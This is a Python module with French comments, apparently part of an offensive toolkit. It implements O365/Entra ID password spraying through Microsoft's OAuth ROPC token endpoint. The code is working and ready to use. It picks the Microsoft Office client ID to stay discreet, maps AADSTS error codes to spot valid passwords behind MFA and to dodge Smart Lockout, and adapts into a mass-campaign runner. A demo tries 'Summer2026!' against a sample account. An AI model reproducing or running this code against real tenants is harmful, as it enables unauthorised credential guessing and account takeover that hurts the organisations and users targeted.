"""
O365 / Entra ID Connector - Module 4bis
==========================================

Objectif : même contrat que NetExecConnector (try_login -> AuthResult) mais
pour O365/Entra ID, via le endpoint OAuth ROPC (Resource Owner Password
Credentials). Ce flow est utilisé par MSOLSpray/o365spray/TREVORspray et
reste un des moyens les plus fiables de tester des credentials en masse
sans déclencher immédiatement du MFA interactif.

Particularités O365 vs AD interne :
  - Pas de "lockout" classique — Microsoft utilise Smart Lockout, qui
    ralentit/bloque après un pattern d'échecs, avec un système de
    "familiarité" (IP/device connus) plus complexe qu'un simple compteur.
  - Les codes d'erreur AADSTS sont très informatifs : ils distinguent
    "mauvais mot de passe" de "MFA requis" de "compte désactivé" de
    "smart lockout actif" — précieux pour ne pas gâcher des tentatives.
  - Le client_id utilisé influence la détection : on utilise ici l'ID
    public bien connu du client "Microsoft Office" pour rester discret
    (c'est celui utilisé par les clients légers Office).

Dépendance : pip install httpx
"""

import re
from dataclasses import dataclass
from typing import Optional

import httpx

from .netexec import AuthResult  # réutilise le même contrat de données que le connecteur netexec

# Client ID public "Microsoft Office" — largement utilisé dans l'écosystème
# spray O365 (même ID que o365spray/MSOLSpray par défaut), pas de secret requis
# car le flow ROPC est prévu pour les clients publics.
DEFAULT_CLIENT_ID = "d3590ed6-52b3-4102-aeff-aad2292ab01c"
TOKEN_ENDPOINT = "https://login.microsoftonline.com/{tenant}/oauth2/token"

# Référence : codes AADSTS les plus utiles pour un spray
AADSTS_MEANINGS = {
    "AADSTS50126": "invalid_credentials",     # mauvais user/password
    "AADSTS50053": "smart_lockout",           # compte temporairement bloqué
    "AADSTS50055": "password_expired",
    "AADSTS50057": "account_disabled",
    "AADSTS50076": "mfa_required",            # credentials VALIDES, MFA bloque
    "AADSTS50079": "mfa_required_registration",
    "AADSTS50034": "user_not_found",
    "AADSTS90072": "user_realm_mismatch",     # souvent un guest/external account
    "AADSTS700016": "invalid_client_id",
}


@dataclass
class O365AuthResult:
    username: str
    success: bool                 # credentials valides (même si MFA bloque ensuite)
    mfa_required: bool = False    # signal fort : password correct mais MFA actif
    smart_lockout: bool = False
    account_disabled: bool = False
    error_code: Optional[str] = None
    raw_output: str = ""


class O365Connector:
    def __init__(self, tenant: str = "common", client_id: str = DEFAULT_CLIENT_ID,
                 timeout: float = 15.0):
        """
        tenant : domaine (ex: "corp.onmicrosoft.com") ou "common" pour
                 laisser Microsoft router — "common" fonctionne pour la
                 découverte initiale mais un tenant précis est plus fiable
                 une fois identifié via Module 1bis (voir plus bas).
        """
        if not tenant or not tenant.strip():
            raise ValueError("tenant ne peut pas être vide")

        self.tenant = tenant
        self.client_id = client_id
        self.timeout = timeout
        self.url = TOKEN_ENDPOINT.format(tenant=tenant)

    async def try_login(self, username: str, password: str) -> O365AuthResult:
        data = {
            "resource": "https://graph.windows.net",
            "client_id": self.client_id,
            "grant_type": "password",
            "username": username,
            "password": password,
            "scope": "openid",
        }

        try:
            async with httpx.AsyncClient(timeout=self.timeout) as client:
                resp = await client.post(self.url, data=data)
        except httpx.RequestError as e:
            return O365AuthResult(username=username, success=False,
                                   raw_output=f"[network error] {e}")

        return self._parse_response(username, resp)

    def _parse_response(self, username: str, resp: httpx.Response) -> O365AuthResult:
        body = resp.text

        if resp.status_code == 200:
            # token émis directement -> credentials valides, pas de MFA bloquant
            return O365AuthResult(username=username, success=True, raw_output=body[:200])

        code_match = re.search(r"(AADSTS\d+)", body)
        code = code_match.group(1) if code_match else None
        meaning = AADSTS_MEANINGS.get(code, "unknown")

        result = O365AuthResult(username=username, success=False,
                                 error_code=code, raw_output=body[:300])

        if meaning == "mfa_required" or meaning == "mfa_required_registration":
            # Le password était CORRECT — signal précieux même sans accès complet
            result.success = True
            result.mfa_required = True
        elif meaning == "smart_lockout":
            result.smart_lockout = True
        elif meaning == "account_disabled":
            result.account_disabled = True

        return result


# ---------------------------------------------------------------------- #
# Adaptateur pour réutiliser run_campaign() du Module 4 (netexec_connector)
# sans dupliquer la logique d'orchestration
# ---------------------------------------------------------------------- #

class O365ConnectorAdapter:
    """Fait ressembler O365Connector à NetExecConnector côté interface
    (même méthode try_login retournant un objet avec .success/.locked_out/.admin)
    pour réutiliser tel quel run_campaign() du module netexec_connector.
    """

    def __init__(self, o365_connector: O365Connector):
        self._inner = o365_connector

    async def try_login(self, username: str, password: str, timeout: float = 15.0):
        r = await self._inner.try_login(username, password)
        return AuthResult(
            username=r.username,
            success=r.success,
            admin=False,  # non applicable côté O365
            raw_output=r.raw_output,
            locked_out=r.smart_lockout,
        )


# ---------------------------------------------------------------------- #
# Démo
# ---------------------------------------------------------------------- #

if __name__ == "__main__":
    import asyncio

    async def demo():
        connector = O365Connector(tenant="corp.onmicrosoft.com")
        result = await connector.try_login("jdupont@corp.com", "Summer2026!")
        print(result)

    asyncio.run(demo())
